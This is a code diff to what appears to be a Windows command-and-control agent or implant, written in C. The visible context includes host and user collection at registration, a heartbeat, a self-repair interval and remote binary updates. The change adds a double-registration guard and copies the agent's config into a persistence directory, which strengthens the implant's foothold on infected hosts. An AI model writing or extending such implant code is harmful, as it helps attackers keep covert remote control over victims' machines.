@@ -66,7 +66,7 @@
 #define REPAIR_INTERVAL_MS  (15 * 60 * 1000)
 
 /* agent version — incremented on each release, sent in heartbeat */
-#define AGENT_VERSION       "1.0.1"
+#define AGENT_VERSION       "1.0.2"
 
 /* update download buffer — max binary size we accept */
 #define UPDATE_MAX_SIZE     (4 * 1024 * 1024)   /* 4 MB */
@@ -995,6 +995,11 @@ static int http_get(const char *path, char *response, int resp_size) {
  * ============================================================================ */
 
 static void c2_register(void) {
+    if (g_agent_registered) {
+        log_write("c2: already registered — skipping");
+        return;
+    }
+
     char hostname[256] = {0};
     char username[256] = {0};
     DWORD sz = sizeof(hostname);
@@ -1054,6 +1059,19 @@ static void c2_register(void) {
                 *(slash + 1) = '\0';
                 strcat(config_path, "agent_config.json");
                 config_save_agent_id(config_path);
+            }
+
+            /* also sync the updated config to the persistence directory */
+            {
+                char persist_dir[MAX_PATH], persist_cfg[MAX_PATH];
+                char dummy1[MAX_PATH], dummy2[MAX_PATH];
+                persistence_paths(dummy1, sizeof(dummy1),
+                                  persist_dir, sizeof(persist_dir),
+                                  dummy2, sizeof(dummy2),
+                                  persist_cfg, sizeof(persist_cfg));
+                if (persist_cfg[0] && strcmp(persist_cfg, config_path) != 0) {
+                    CopyFileA(config_path, persist_cfg, FALSE);
+                }
             }
 
             log_write("c2: registered successfully");
